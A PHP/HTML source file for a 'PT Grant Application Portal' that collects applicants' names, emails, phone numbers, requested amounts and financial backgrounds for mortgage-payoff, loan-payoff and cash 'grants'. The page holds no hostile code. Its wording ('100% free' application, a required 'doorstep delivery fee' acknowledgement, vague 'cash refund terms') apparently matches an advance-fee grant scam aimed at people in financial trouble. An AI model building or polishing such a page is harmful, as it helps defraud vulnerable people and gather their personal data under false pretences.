<?php
// Handle feedback messages passed via URL from save.php
$status = $_GET['status'] ?? '';
$message = '';
$messageType = '';

if ($status === 'success') {
    $refId = htmlspecialchars($_GET['ref'] ?? '00000');
    $message = "Application submitted successfully! Your Application Reference ID is <strong>#GRANT-{$refId}</strong>.";
    $messageType = "success";
} elseif ($status === 'error') {
    $message = htmlspecialchars($_GET['msg'] ?? 'An error occurred during submission.');
    $messageType = "error";
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PT Grant Application Portal | Brilliant & Secure</title>
    <!-- Google Fonts & FontAwesome -->
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        :root {
            --primary: #4f46e5;
            --primary-glow: rgba(79, 70, 229, 0.4);
            --accent: #06b6d4;
            --success: #10b981;
            --card-bg: rgba(255, 255, 255, 0.85);
            --text-main: #0f172a;
            --text-muted: #475569;
            --border: rgba(226, 232, 240, 0.8);
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Plus Jakarta Sans', sans-serif;
        }

        body {
            background-color: #030712;
            color: var(--text-main);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 40px 16px;
            overflow-x: hidden;
            position: relative;
        }

        /* Brilliant Animated Background Designs */
        .bg-mesh {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            z-index: -1;
            background: radial-gradient(circle at 15% 20%, #31105e 0%, transparent 40%),
                        radial-gradient(circle at 85% 80%, #0c4a6e 0%, transparent 40%),
                        radial-gradient(circle at 50% 50%, #1e1b4b 0%, #030712 100%);
        }

        .blob {
            position: fixed;
            filter: blur(80px);
            width: 450px;
            height: 450px;
            border-radius: 50%;
            z-index: -1;
            animation: floatBlob 12s infinite alternate ease-in-out;
            opacity: 0.5;
        }

        .blob-1 { top: -10%; left: -10%; background: #6366f1; }
        .blob-2 { bottom: -10%; right: -10%; background: #06b6d4; animation-delay: -6s; }
        .blob-3 { top: 40%; left: 30%; width: 300px; height: 300px; background: #ec4899; animation-duration: 18s; opacity: 0.3; }

        @keyframes floatBlob {
            0% { transform: translate(0px, 0px) scale(1); }
            100% { transform: translate(40px, 60px) scale(1.1); }
        }

        /* Portal Main Container with Glassmorphism */
        .portal-wrapper {
            width: 100%;
            max-width: 900px;
            z-index: 1;
        }

        .main-card {
            background: var(--card-bg);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            padding: 50px;
            border-radius: 24px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5),
                        0 0 0 1px rgba(255, 255, 255, 0.3) inset;
        }

        header {
            text-align: center;
            margin-bottom: 35px;
        }

        .logo-badge {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            width: 70px;
            height: 70px;
            background: linear-gradient(135deg, var(--primary), var(--accent));
            color: white;
            font-size: 28px;
            border-radius: 20px;
            margin-bottom: 18px;
            box-shadow: 0 10px 25px var(--primary-glow);
            transform: rotate(-5deg);
            transition: transform 0.3s;
        }

        .logo-badge:hover {
            transform: rotate(0deg) scale(1.05);
        }

        header h1 {
            font-size: 2.2rem;
            font-weight: 800;
            color: var(--text-main);
            letter-spacing: -0.02em;
            margin-bottom: 8px;
        }

        header p {
            color: var(--text-muted);
            font-size: 1.05rem;
            font-weight: 500;
        }

        /* Interactive Category Cards Grid */
        .grant-highlights {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(190px, 1fr));
            gap: 16px;
            margin-bottom: 32px;
        }

        .highlight-item {
            background: rgba(255, 255, 255, 0.7);
            border: 1px solid var(--border);
            padding: 18px;
            border-radius: 14px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            position: relative;
            overflow: hidden;
        }

        .highlight-item::before {
            content: '';
            position: absolute;
            top: 0; left: 0; width: 100%; height: 3px;
            background: linear-gradient(90deg, var(--primary), var(--accent));
            opacity: 0;
            transition: opacity 0.3s;
        }

        .highlight-item:hover {
            border-color: var(--primary);
            background: #ffffff;
            transform: translateY(-4px);
            box-shadow: 0 10px 25px -5px rgba(79, 70, 229, 0.15);
        }

        .highlight-item:hover::before {
            opacity: 1;
        }

        .highlight-item i {
            color: var(--primary);
            font-size: 24px;
            margin-bottom: 10px;
        }

        .highlight-item span {
            display: block;
            font-size: 0.9rem;
            font-weight: 700;
            color: var(--text-main);
        }

        /* Brilliant Notice Box */
        .notice-box {
            background: linear-gradient(135deg, rgba(16, 185, 129, 0.08), rgba(6, 182, 212, 0.08));
            border: 1px solid rgba(16, 185, 129, 0.2);
            border-left: 5px solid var(--success);
            padding: 22px;
            border-radius: 14px;
            margin-bottom: 32px;
            font-size: 0.95rem;
            color: #064e3b;
        }

        .notice-box strong {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-bottom: 10px;
            font-size: 1.05rem;
            color: #047857;
        }

        .notice-box ul {
            margin-left: 20px;
        }

        .notice-box li {
            margin-bottom: 6px;
        }

        /* Form Grid Controls */
        .form-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 22px;
        }

        .form-group {
            margin-bottom: 4px;
        }

        .form-group.full-width {
            grid-column: span 2;
        }

        label {
            display: block;
            font-weight: 700;
            font-size: 0.88rem;
            margin-bottom: 8px;
            color: #1e293b;
            letter-spacing: 0.01em;
        }

        input[type="text"], 
        input[type="email"], 
        input[type="tel"], 
        input[type="number"], 
        select, 
        textarea {
            width: 100%;
            padding: 14px 18px;
            border: 1.5px solid var(--border);
            border-radius: 12px;
            font-size: 1rem;
            background: rgba(255, 255, 255, 0.9);
            color: var(--text-main);
            transition: all 0.25s ease;
        }

        input:focus, select:focus, textarea:focus {
            outline: none;
            border-color: var(--primary);
            background: #ffffff;
            box-shadow: 0 0 0 4px var(--primary-glow);
        }

        textarea {
            height: 130px;
            resize: vertical;
        }

        .checkbox-container {
            display: flex;
            align-items: flex-start;
            gap: 14px;
            margin: 28px 0;
            font-size: 0.92rem;
            background: rgba(248, 250, 252, 0.8);
            padding: 18px;
            border-radius: 12px;
            border: 1.5px solid var(--border);
        }

        .checkbox-container input {
            margin-top: 3px;
            width: 20px;
            height: 20px;
            accent-color: var(--primary);
            cursor: pointer;
        }

        button[type="submit"] {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, var(--primary), #4338ca);
            color: white;
            border: none;
            border-radius: 14px;
            font-size: 1.1rem;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            box-shadow: 0 10px 25px var(--primary-glow);
        }

        button[type="submit"]:hover {
            transform: translateY(-2px);
            box-shadow: 0 15px 30px var(--primary-glow);
            filter: brightness(1.1);
        }

        button[type="submit"]:active {
            transform: scale(0.98);
        }

        /* Alert Banners */
        .alert {
            padding: 16px;
            border-radius: 12px;
            margin-bottom: 25px;
            text-align: center;
            font-size: 0.98srem;
            font-weight: 600;
        }
        .alert.success {
            background: #dcfce7;
            color: #166534;
            border: 1px solid #bbf7d0;
        }
        .alert.error {
            background: #fee2e2;
            color: #991b1b;
            border: 1px solid #fecaca;
        }

        footer {
            text-align: center;
            margin-top: 35px;
            font-size: 0.88rem;
            color: rgba(255, 255, 255, 0.6);
            font-weight: 500;
        }

        @media (max-width: 768px) {
            .form-grid { grid-template-columns: 1fr; }
            .form-group.full-width { grid-column: span 1; }
            .main-card { padding: 25px; }
            header h1 { font-size: 1.8rem; }
        }
    </style>
</head>
<body>

<!-- Animated Background Designs -->
<div class="bg-mesh"></div>
<div class="blob blob-1"></div>
<div class="blob blob-2"></div>
<div class="blob blob-3"></div>

<div class="portal-wrapper">
    <div class="main-card">
        <header>
            <div class="logo-badge">
                <i class="fa-solid fa-gem"></i>
            </div>
            <h1>PT Grant Application Portal</h1>
            <p>Brilliant financial solutions for homes, mortgages, loans, and cash support.</p>
        </header>

        <!-- Interactive Category Selectors -->
        <div class="grant-highlights">
            <div class="highlight-item" onclick="selectCategory('Home Assistance Grant')">
                <i class="fa-solid fa-house-laptop"></i>
                <span>Home Grant</span>
            </div>
            <div class="highlight-item" onclick="selectCategory('Mortgage Payoff Grant')">
                <i class="fa-solid fa-shield-halved"></i>
                <span>Mortgage Help</span>
            </div>
            <div class="highlight-item" onclick="selectCategory('Loan Payoff Help')">
                <i class="fa-solid fa-file-invoice-dollar"></i>
                <span>Other Loans</span>
            </div>
            <div class="highlight-item" onclick="selectCategory('Cash Grant Help')">
                <i class="fa-solid fa-wallet"></i>
                <span>Cash Help</span>
            </div>
        </div>

        <!-- Disclosure Box -->
        <div class="notice-box">
            <strong><i class="fa-solid fa-circle-info"></i> Important Program Disclosures:</strong>
            <ul>
                <li><strong>100% Free Application:</strong> No registration, administrative, or processing fees required.</li>
                <li><strong>Doorstep Delivery Fee:</strong> Standard delivery fees apply exclusively when physical items are shipped directly to your doorstep.</li>
                <li><strong>Cash Refund Policy:</strong> Disbursed cash grants are fully eligible for refunds under verified terms.</li>
            </ul>
        </div>

        <!-- Alert Notification -->
        <?php if (!empty($message)): ?>
            <div class="alert <?php echo $messageType; ?>">
                <?php echo $message; ?>
            </div>
        <?php endif; ?>

        <!-- Form linked to save.php -->
        <form method="POST" action="save.php">
            <div class="form-grid">
                <div class="form-group">
                    <label for="fullName">Full Name *</label>
                    <input type="text" id="fullName" name="fullName" required placeholder="e.g. Sarah Jenkins">
                </div>

                <div class="form-group">
                    <label for="email">Email Address *</label>
                    <input type="email" id="email" name="email" required placeholder="sarah@example.com">
                </div>

                <div class="form-group">
                    <label for="phone">Phone Number *</label>
                    <input type="tel" id="phone" name="phone" required placeholder="(555) 019-2834">
                </div>

                <div class="form-group">
                    <label for="grantType">Grant Category *</label>
                    <select id="grantType" name="grantType" required>
                        <option value="">-- Choose Category --</option>
                        <option value="Home Assistance Grant">Home Assistance Grant</option>
                        <option value="Mortgage Payoff Grant">Mortgage Payoff Grant</option>
                        <option value="Loan Payoff Help">Loan Payoff Help</option>
                        <option value="Cash Grant Help">Cash Grant Help</option>
                    </select>
                </div>

                <div class="form-group full-width">
                    <label for="amountRequested">Estimated Amount Requested ($) *</label>
                    <input type="number" id="amountRequested" name="amountRequested" step="0.01" min="100" required placeholder="7500.00">
                </div>

                <div class="form-group full-width">
                    <label for="reason">Reason for Application & Financial Background *</label>
                    <textarea id="reason" name="reason" required placeholder="Briefly describe your situation and how this grant will assist your financial goals..."></textarea>
                </div>
            </div>

            <div class="checkbox-container">
                <input type="checkbox" id="deliveryFeeAccepted" name="deliveryFeeAccepted" value="1" required>
                <label for="deliveryFeeAccepted" style="cursor: pointer; margin-bottom: 0;">
                    I verify that submitting this application is free, and I understand that doorstep delivery fees apply if physical materials are shipped. I also acknowledge cash grant refund terms.
                </label>
            </div>

            <button type="submit">
                <i class="fa-solid fa-paper-plane" style="margin-right: 8px;"></i> Submit Free Application
            </button>
        </form>
    </div>

    <footer>
        &copy; <?php echo date('Y'); ?> PT Grant Portal. Brilliance in Financial Relief. All rights reserved.
    </footer>
</div>

<script>
    // Quick selector to map highlight cards to form dropdown
    function selectCategory(categoryName) {
        const selectElement = document.getElementById('grantType');
        selectElement.value = categoryName;
        selectElement.focus();
        selectElement.scrollIntoView({ behavior: 'smooth', block: 'center' });
    }
</script>

</body>
</html>
